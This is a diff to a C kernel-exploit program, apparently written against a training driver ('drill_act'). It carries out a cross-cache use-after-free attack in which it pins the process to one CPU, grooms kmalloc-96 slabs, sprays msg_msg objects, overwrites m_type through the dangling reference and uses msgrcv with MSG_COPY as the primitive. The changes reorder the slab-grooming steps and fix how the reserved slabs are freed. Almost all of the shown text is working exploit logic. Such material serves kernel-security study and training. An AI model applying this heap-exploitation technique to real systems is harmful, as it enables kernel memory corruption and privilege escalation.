@@ -163,25 +163,22 @@ int act(int fd, int code, int n, char *args)
 
 /*
  * Cross-cache attack:
- *  0) collect the needed info:
- *   /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
- *     120
- *   /sys/kernel/slab/msg_msg-96/cpu_partial
- *     120
- *   /sys/kernel/slab/msg_msg-96/objs_per_slab
- *     42
- *   /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
- *     42
- *  1) pin the process to a single CPU
- *  2) plug holes, allocate objs_per_slab objects
- *  3) allocate objs_per_slab * cpu_partial = 5040 objects (to later overﬂow partial list)
- *  4) obtain dangling reference from use-after-free bug
- *  5) create new active slab, allocate objs_per_slab + 1 objects
- *  6) free objs_per_slab * 2 - 1 = 83 objects before last object (to fully free slab with uaf object)
- *  7) free 1 out of each objs_per_slab objects in reserved slabs (this will provoke the partial list cleanup)
- *  8) allocate objs_per_slab * 2 = 84 target objects to create and fill new target slab
- *  9) perform uaf write using the dangling reference
- *  10) execute the exploit primitive via the overwritten target object
+ *  - collect the needed info:
+ *      /sys/kernel/slab/kmalloc-rnd-04-96/cpu_partial
+ *        120
+ *      /sys/kernel/slab/kmalloc-rnd-04-96/objs_per_slab
+ *        42
+ *  - pin the process to a single CPU
+ *  - create new active slab, allocate objs_per_slab objects
+ *  - allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list
+ *  - create new active slab, allocate objs_per_slab objects
+ *  - obtain dangling reference from use-after-free bug
+ *  - create new active slab, allocate objs_per_slab objects
+ *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
+ *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
+ *  - allocate (objs_per_slab * 2) target objects to create and fill new target slab
+ *  - perform uaf write using the dangling reference
+ *  - execute the exploit primitive via the overwritten target object
  */
 #define OBJS_PER_SLAB 42
 #define CPU_PARTIAL 120
@@ -192,6 +189,7 @@ int main(void)
 	int fd = -1;
 	long i = 0;
 	long current_n = 0;
+	long reserved_from_n = 0;
 	long uaf_n = 0;
 	ssize_t bytes = 0;
 	long uaf_msg_n = 0;
@@ -209,10 +207,10 @@ int main(void)
 	}
 	printf("[+] drill_act is opened\n");
 
-	printf("1) pin the process to a single CPU\n");
+	printf("[!] pin the process to a single CPU\n");
 	do_cpu_pinning();
 
-	printf("2) plug holes, allocate objs_per_slab objects\n");
+	printf("[!] create new active slab, allocate objs_per_slab objects\n");
 	for (i = 0; i < OBJS_PER_SLAB; i++) {
 		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
@@ -221,8 +219,9 @@ int main(void)
 	}
 	current_n += i;
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
+	reserved_from_n = current_n;
 
-	printf("3) allocate objs_per_slab * cpu_partial = 5040 objects (to later overﬂow partial list)\n");
+	printf("[!] allocate (objs_per_slab * cpu_partial) objects to later overflow the partial list\n");
 	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i++) {
 		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
@@ -232,12 +231,8 @@ int main(void)
 	current_n += i;
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
 
-	printf("4) obtain dangling reference from use-after-free bug\n");
- 	uaf_n = current_n - 1;
-	printf("[+] done, uaf_n: %ld\n", uaf_n);
-
-	printf("5) create new active slab, allocate objs_per_slab + 1 objects\n");
-	for (i = 0; i < OBJS_PER_SLAB + 1; i++) {
+	printf("[!] create new active slab, allocate objs_per_slab objects\n");
+	for (i = 0; i < OBJS_PER_SLAB; i++) {
 		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_ALLOC\n");
 			goto end;
@@ -246,7 +241,21 @@ int main(void)
 	current_n += i;
 	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
 
-	printf("6) free objs_per_slab * 2 - 1 = 83 objects before last object (to fully free slab with uaf object)\n");
+	printf("[!] obtain dangling reference from use-after-free bug\n");
+ 	uaf_n = current_n - 1;
+	printf("[+] done, uaf_n: %ld\n", uaf_n);
+
+	printf("[!] create new active slab, allocate objs_per_slab objects\n");
+	for (i = 0; i < OBJS_PER_SLAB; i++) {
+		if (act(fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
+			printf("[-] DRILL_ACT_ALLOC\n");
+			goto end;
+		}
+	}
+	current_n += i;
+	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
+
+	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
 	current_n--; /* point to the last allocated */
 	current_n--; /* don't free the last allocated to keep this active slab */
 	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
@@ -259,16 +268,18 @@ int main(void)
 	assert(current_n < uaf_n); /* to be sure that uaf object is freed */
 	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);
 
-	printf("7) free 1 out of each objs_per_slab objects in reserved slabs (this will provoke the partial list cleanup)\n");
-	for (i = 0; current_n - i >= 0; i += OBJS_PER_SLAB) {
-		if (act(fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
+	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
+	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL; i += OBJS_PER_SLAB) {
+		if (act(fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
 			printf("[-] DRILL_ACT_FREE\n");
 			goto end;
 		}
 	}
+	/* Now current_n should point to the last element in the reserved slabs */
+	assert(reserved_from_n + i - 1 == current_n);
 	printf("[+] done, now go spraying\n");
 
-	printf("8) allocate objs_per_slab * 2 = 84 target objects to create and fill new target slab\n");
+	printf("[!] allocate (objs_per_slab * 2) target objects to create and fill new target slab\n");
 	for (i = 0; i < OBJS_PER_SLAB * 2; i++) {
 		ret = msgsnd(msqid, &msg_oob_r, sizeof(msg_oob_r.mtext), 0);
 		if (ret) {
@@ -278,7 +289,7 @@ int main(void)
 	}
 	printf("[+] msg_msg spraying is done\n");
 
-	printf("9) perform uaf write using the dangling reference\n");
+	printf("[!] perform uaf write using the dangling reference\n");
 	/*
 	 * Overwrite msg_msg m_type:
 	 *  - m_type in msg_msg is at the offset 16;
@@ -299,7 +310,7 @@ int main(void)
 		goto end;
 	printf("[+] DRILL_ACT_SAVE_VAL\n");
 
-	printf("10) execute the exploit primitive via the overwritten target object\n");
+	printf("[!] execute the exploit primitive via the overwritten target object\n");
 	for (i = 0; i < OBJS_PER_SLAB * 2; i++) {
 		bytes = msgrcv(msqid, msgrcv_buf, MSG_OOB_SIZE, i, IPC_NOWAIT | MSG_COPY);
 		if (bytes == -1) {
